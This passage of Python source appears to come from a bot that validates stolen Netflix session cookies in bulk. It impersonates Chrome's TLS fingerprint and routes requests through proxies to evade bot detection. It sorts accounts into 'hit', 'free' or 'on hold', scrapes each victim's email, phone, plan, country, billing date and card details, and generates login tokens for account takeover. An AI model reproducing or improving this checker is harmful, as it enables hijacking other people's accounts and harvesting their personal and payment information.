    generate_token  → set False in bulk mode; token generated on demand via button.

    Uses curl_cffi with Chrome124 TLS fingerprint impersonation to avoid
    Netflix bot-detection that causes valid cookies to appear invalid.
    """
    import concurrent.futures as _cf
    cookie_text = cookie_text.strip()

    combo = parse_combo_line(cookie_text)
    if combo:
        cookies = combo.pop("cookies")
        file_meta = combo
    else:
        file_meta = extract_file_metadata(cookie_text)
        cookies = auto_parse_cookies(cookie_text)

    if not cookies:
        m = _NETFLIX_ID_RE.search(cookie_text)
        if m:
            val = m.group(1).strip().rstrip('",;|\')')
            if val:
                cookies = {"NetflixId": val}

    if not cookies:
        return {"status": "error", "message": "Could not parse any cookies from this file."}

    session_cookies = {"NetflixId", "SecureNetflixId", "nfvdid", "gsid"}
    if not any(k in cookies for k in session_cookies):
        return {
            "status": "invalid",
            "message": f"No Netflix session cookies found. Got: {', '.join(list(cookies.keys())[:8])}",
        }

    _timeout = 8 if bulk_mode else 12
    session, using_curl, _proxy_dict = _make_session(bulk_mode)

    # ── Fetch membership page (+ optional parallel NFToken) ───────────────────
    nft_result: dict = {"success": False, "error": "skipped"}

    def _fetch_account():
        """
        Fetch /account/membership — single source of truth for all fields.
        Handles 429 rate-limiting with backoff, and detects login-page responses
        both by URL and by HTML body content (Netflix sometimes returns 200
        with a login page instead of redirecting).
        """
        urls = ["https://www.netflix.com/account/membership"]
        if not bulk_mode:
            urls.append("https://www.netflix.com/browse")

        max_attempts = 2
        backoff_secs = [0, 1, 3]

        for url in urls:
            for attempt in range(max_attempts):
                try:
                    if attempt > 0:
                        time.sleep(backoff_secs[min(attempt, len(backoff_secs) - 1)])

                    r = session.get(
                        url,
                        cookies=cookies,
                        timeout=_timeout,
                        allow_redirects=True,
                        **({"proxies": _proxy_dict} if _proxy_dict else {}),
                    )

                    # ── Rate limit detection ─────────────────────────────────
                    if _is_rate_limited(r.status_code, r.text):
                        retry_after = int(r.headers.get("Retry-After", 3))
                        wait = min(retry_after, 10)
                        logger.warning("Rate limited by Netflix (HTTP %s) — waiting %ss", r.status_code, wait)
                        time.sleep(wait)
                        continue  # retry this URL

                    # ── Auth failure detection ───────────────────────────────
                    if r.status_code in (401, 403):
                        return "INVALID", r.text

                    # ── Login page detection (URL + body) ────────────────────
                    if _is_login_page(r.url, r.text):
                        return "INVALID", r.text

                    # ── Success ──────────────────────────────────────────────
                    if r.status_code == 200 and len(r.text) > 1000:
                        return "OK", r.text

                    # ── Non-200 non-429 → try next URL ───────────────────────
                    break

                except Exception as exc:
                    logger.debug("_fetch_account attempt %d error: %s", attempt, exc)
                    if attempt == max_attempts - 1:
                        break
                    time.sleep(backoff_secs[min(attempt + 1, len(backoff_secs) - 1)])

        return "ERROR", ""

    def _fetch_nftoken():
        return generate_nftoken(cookies)

    try:
        if generate_token:
            # Single check: start account + NFToken fetches in parallel.
            # Wait for the account check (critical path), then give the NFToken
            # request a 1.5s grace window after that. If it misses the window
            # the result is returned immediately; the user gets a "Get Login
            # Link" button that generates the token on demand.
            pool = _cf.ThreadPoolExecutor(max_workers=2)
            f_account = pool.submit(_fetch_account)
            f_nft     = pool.submit(_fetch_nftoken)
            acct_status, acct_text = f_account.result()
            try:
                nft_result = f_nft.result(timeout=1.5)
            except _cf.TimeoutError:
                nft_result = {"success": False, "error": "generating…"}
            finally:
                pool.shutdown(wait=False)
        else:
            # Bulk check: account only — NFToken generated on demand via button
            acct_status, acct_text = _fetch_account()

        if acct_status == "INVALID":
            return {"status": "invalid", "message": "Cookie is expired or invalid (Netflix redirected to login)."}
        if acct_status == "ERROR" or not acct_text:
            return {"status": "error", "message": "Could not reach Netflix account page."}

        account_html = acct_text
        browse_html  = ""   # no longer fetched separately — all data from membership page

        result: dict = {"status": "hit"}

        # Cookie tokens
        result["netflix_id"]        = cookies.get("NetflixId", "")
        result["secure_netflix_id"] = cookies.get("SecureNetflixId", "")
        result["nfvdid"]            = cookies.get("nfvdid", "")
        result["phone"]             = file_meta.get("phone") or ""
        result["password"]          = file_meta.get("password") or ""

        # ── userInfo ──────────────────────────────────────────────────────────
        userinfo = _extract_userinfo(account_html) or _extract_userinfo(browse_html)

        # ── Membership status (highest priority) ──────────────────────────────
        ms_status = ""
        if userinfo:
            ms_status = (userinfo.get("membershipStatus") or "").upper()

        if ms_status in ("FORMER_MEMBER", "NEVER_MEMBER", "VOLUNTARILY_CANCELLED", "CANCELLED"):
            result["status"] = "free"
        elif ms_status in ("ON_HOLD", "PAYMENT_HOLD", "PAYMENT_DUE", "SUSPENDED"):
            result["status"] = "on_hold"
            # Pre-populate issues immediately — _detect_account_issues may miss these
            # when reactContext is thin or the HTML is a redirect page
            _ms_issue_map = {
                "SUSPENDED":    "Account suspended — access restricted",
                "PAYMENT_DUE":  "Payment due — account on hold",
                "PAYMENT_HOLD": "Payment on hold — update payment method",
                "ON_HOLD":      "Account on hold (payment failed)",
            }
            _pre_issue = _ms_issue_map.get(ms_status, f"Account status: {ms_status}")

        result["membership_status"] = ms_status or "Unknown"
        result["is_in_free_trial"]  = userinfo.get("isInFreeTrial", False) if userinfo else False

        # ── Account issues / warnings ─────────────────────────────────────────
        issues = _detect_account_issues(account_html)
        # Merge the pre-issue (from membershipStatus) if _detect_account_issues
        # didn't already find it (happens when reactContext is thin/redirect page)
        try:
            _pre = _pre_issue  # type: ignore[name-defined]  # set above if on_hold ms
            if _pre and not any(_pre.lower().split()[0] in i.lower() for i in issues):
                issues = [_pre] + issues
        except NameError:
            pass
        result["account_issues"] = issues

        # ── Email ─────────────────────────────────────────────────────────────
        email = None
        if userinfo:
            raw_email = userinfo.get("emailAddress") or userinfo.get("email")
            if raw_email and "@" in str(raw_email):
                email = str(raw_email)
        if not email:
            html_decoded = _decode_js_hex(account_html)
            for pat in [
                r'"emailAddress"\s*:\s*"([^"@]+@[^"]+)"',
                r'"email"\s*:\s*"([^"@]{1,60}@[^"]{3,60})"',
            ]:
                m = re.search(pat, html_decoded)
                if m:
                    cand = m.group(1).strip()
                    if "@" in cand and "." in cand.split("@")[1]:
                        email = cand
                        break
        result["email"] = email or file_meta.get("email") or "Hidden"

        # ── Email verified ────────────────────────────────────────────────────
        result["email_verified"] = _extract_email_verified(account_html)

        # ── Display name ──────────────────────────────────────────────────────
        name = file_meta.get("name") or ""
        if not name and userinfo:
            raw_name = userinfo.get("name") or userinfo.get("firstName") or userinfo.get("displayName")
            if raw_name:
                cand = str(raw_name).strip()
                if not any(x in cand.lower() for x in ("netflix", "plan", "standard", "premium", "basic", "mobile")):
                    name = cand
        result["name"] = name or ""

        # ── Phone ─────────────────────────────────────────────────────────────
        if not result["phone"]:
            result["phone"] = _extract_phone(account_html) or _extract_phone(browse_html) or ""

        # ── Plan / quality / streams ──────────────────────────────────────────
        plan_info = _extract_member_plan(account_html) or _extract_member_plan(browse_html)

        plan_name  = plan_info.get("plan_name")  or file_meta.get("plan_name") or ""
        quality    = plan_info.get("quality")    or file_meta.get("quality")   or ""
        max_streams= plan_info.get("max_streams")or file_meta.get("max_streams") or ""

        if plan_name and (not quality or not max_streams):
            for key, info in PLAN_MAP.items():
                if key in plan_name.lower():
                    quality     = quality     or info["quality"]
                    max_streams = max_streams or str(info["streams"])
                    break

        if not plan_name:
            for key, info in PLAN_MAP.items():
                if key in account_html.lower():
                    plan_name   = info["name"]
                    quality     = quality     or info["quality"]
                    max_streams = max_streams or str(info["streams"])
                    break

        result["plan_name"]        = plan_name   or "Unknown"
        result["quality"]          = quality     or "Unknown"
        result["max_streams"]      = max_streams or "Unknown"
        result["has_ads"]          = plan_info.get("has_ads", False)
        result["is_on_hold"]       = plan_info.get("is_on_hold", False)
        result["num_extra_members"]= plan_info.get("num_extra_members", 0)

        # ── Backfill plan-level on-hold flag into issues + status ─────────────
        # is_on_hold comes from MemberPlan.isOnHold, which is reliable even when
        # membershipStatus is still "CURRENT_MEMBER" (grace-period accounts).
        if result["is_on_hold"] and result["status"] == "hit":
            result["status"] = "on_hold"
            existing = result.get("account_issues") or []
            if not any("on hold" in i.lower() for i in existing):
                result["account_issues"] = list(existing) + ["Account on hold (payment failed)"]

        # ── Country ───────────────────────────────────────────────────────────
        country = None
        if userinfo:
            country = userinfo.get("countryOfSignup") or userinfo.get("memberCountry")
        if not country:
            html_decoded = _decode_js_hex(account_html)
            for pat in [r'"countryOfSignup"\s*:\s*"([A-Z]{2,3})"', r'"memberCountry"\s*:\s*"([A-Z]{2})"']:
                m = re.search(pat, html_decoded)
                if m:
                    country = m.group(1).strip()
                    break
        result["country"] = country or file_meta.get("country") or "Unknown"

        # ── Member since ──────────────────────────────────────────────────────
        member_since = None
        if userinfo:
            raw = userinfo.get("memberSince") or userinfo.get("joinDate") or userinfo.get("startDate")
            if raw:
                member_since = _parse_date(str(raw))
        if not member_since:
            html_decoded = _decode_js_hex(account_html)
            for pat in [r'"memberSince"\s*:\s*"([^"]+)"', r'"startDate"\s*:\s*"([^"]+)"']:
                m = re.search(pat, html_decoded, re.IGNORECASE)
                if m:
                    member_since = _parse_date(m.group(1).strip())
                    if member_since:
                        break
        result["member_since"] = member_since or file_meta.get("member_since") or "Unknown"

        # ── Next billing ──────────────────────────────────────────────────────
        next_billing = (plan_info.get("next_billing")
                        or _extract_billing_date_from_html(account_html)
                        or _extract_billing_date_from_html(browse_html)
                        or file_meta.get("next_billing") or "")
        if result["status"] == "free":
            next_billing = next_billing or "N/A (cancelled)"
        result["next_billing"] = next_billing or "Unknown"

        # ── Price ─────────────────────────────────────────────────────────────
        price_raw = (plan_info.get("price")
                     or _extract_price_from_html(account_html)
                     or _extract_price_from_html(browse_html)
                     or file_meta.get("price") or "")
        result["price"] = _clean_price(price_raw) if price_raw else "Unknown"

        # ── Payment ───────────────────────────────────────────────────────────
        pay_info = _extract_payment_info(account_html) or _extract_payment_info(browse_html)
        payment  = pay_info.get("payment") or ""
        if not payment:
            html_decoded = _decode_js_hex(account_html)
            for pat in [r'"paymentType"\s*:\s*"([^"]+)"', r'"creditCardType"\s*:\s*"([^"]+)"',
                        r'\b(Visa|Mastercard|VISA|MASTERCARD|American Express|PayPal|Discover|Amex)\b']:
                m = re.search(pat, html_decoded, re.IGNORECASE)
                if m:
                    payment = m.group(1).strip()
                    break
        result["payment"]      = payment or file_meta.get("payment") or "Unknown"
        result["card_type"]    = pay_info.get("card_type")   or ""
        result["card_last4"]   = pay_info.get("card_last4")  or ""
        result["card_expiry"]  = pay_info.get("card_expiry") or ""
        result["card_expired"] = pay_info.get("card_expired", False)
        result["is_third_party"]= pay_info.get("is_third_party", False)
        result["partner_name"] = pay_info.get("partner_name") or ""

        # ── Profiles ──────────────────────────────────────────────────────────
        # Prefer browse page (has full profile list); fall back to account page
        pnames, pcount = _extract_profiles_list(browse_html or account_html)
        if not pnames or pcount == 0:
            pnames, pcount = _extract_profiles_list(account_html)
        result["profile_names"]  = pnames
        result["profile_count"]  = pcount   # accurate count from __ref array
        result["profiles"]       = pcount if pcount > 0 else ("Unknown" if not pnames else len(pnames))

        # ── On-hold final check ───────────────────────────────────────────────
        if result["status"] == "hit" and (result["is_on_hold"] or
                "on hold" in account_html.lower() or "payment hold" in account_html.lower()):
            result["status"] = "on_hold"

        # ── Final sync: on_hold status MUST always have at least one issue ────
        # Ensures the basic mode ⚠️ section always shows why the account is held
        if result["status"] == "on_hold" and not result.get("account_issues"):
            _ms = result.get("membership_status", "")
            _sync_issue_map = {
                "SUSPENDED":    "Account suspended — access restricted",
                "PAYMENT_DUE":  "Payment due — account on hold",
                "PAYMENT_HOLD": "Payment on hold — update payment method",
                "ON_HOLD":      "Account on hold (payment failed)",
            }
            if _ms and _ms in _sync_issue_map:
                _sync_msg = _sync_issue_map[_ms]
            elif result.get("is_on_hold"):
                _sync_msg = "Account on hold (payment failed)"
            else:
                _sync_msg = "Account on hold — payment issue detected"
            result["account_issues"] = [_sync_msg]

        # ── NFToken (already fetched in parallel) ─────────────────────────────
        result["nftoken"] = nft_result

        return result

    except requests.exceptions.Timeout:
        return {"status": "error", "message": "Request timed out. Netflix may be blocking this IP."}
    except requests.exceptions.ConnectionError:
        return {"status": "error", "message": "Connection error. Check internet connectivity."}
    except Exception as e:
        # Also catches curl_cffi.requests.errors.RequestsError and any other
        # network-layer exception so the bot never crashes on a bad account.
        err_name = type(e).__name__
        err_msg = str(e)
        # Classify common curl_cffi / network errors for cleaner messages
        if "timed out" in err_msg.lower() or "timeout" in err_msg.lower() or err_name in ("TimeoutError", "ConnectTimeoutError"):
            return {"status": "error", "message": "Request timed out (curl). Netflix may be rate-limiting."}
        if "connection" in err_msg.lower() or err_name in ("ConnectionError", "ConnectError"):
            return {"status": "error", "message": "Connection error (curl). Check network connectivity."}
        if "ssl" in err_msg.lower() or "certificate" in err_msg.lower():
            return {"status": "error", "message": "SSL/TLS error. Netflix may have updated its certificate chain."}
        logger.exception("Unexpected error in check_cookie")
        return {"status": "error", "message": f"Unexpected error ({err_name}): {err_msg[:200]}"}
